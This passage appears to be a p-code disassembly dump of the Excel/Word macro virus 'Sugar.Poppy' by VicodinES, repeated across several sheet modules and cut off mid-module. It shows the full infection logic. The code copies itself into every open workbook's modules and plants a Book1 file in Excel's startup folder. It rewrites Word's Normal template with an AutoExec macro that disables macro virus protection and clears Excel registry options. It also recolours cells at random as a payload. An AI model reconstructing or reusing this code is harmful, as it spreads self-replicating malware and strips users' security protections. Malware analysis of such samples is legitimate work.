' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet9 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet10 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
